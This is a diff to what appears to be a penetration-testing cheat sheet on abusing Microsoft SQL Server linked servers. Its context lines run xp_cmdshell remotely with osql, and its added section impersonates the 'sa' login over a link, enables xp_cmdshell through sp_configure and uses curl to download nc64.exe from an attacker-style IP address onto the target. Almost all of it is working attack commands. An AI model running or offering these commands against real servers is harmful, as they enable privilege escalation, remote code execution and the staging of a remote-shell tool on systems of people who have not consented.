@@ -95,3 +95,11 @@ osql -E -S "<LOCAL_HOSTNAME>" -Q "EXECUTE('xp_cmdshell whoami') AT [<remote.mane
 osql -E -S "<LOCAL_HOSTNAME>" -Q "EXECUTE('xp_cmdshell ''mkdir C:\mane''') AT [<remote.manesec.local>];"
 
 ```
+
+
+## Using link and impersonal sa to enable xp_cmd
+
+```
+DECLARE @sql NVARCHAR(MAX) = N'EXECUTE AS LOGIN = ''sa''; EXEC sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE; EXEC xp_cmdshell ''cmd /c curl http://10.10.16.25/nc64.exe -o C:\programdata\nc64.exe'';'; EXEC (@sql) AT "PRIMARY";
+
+```
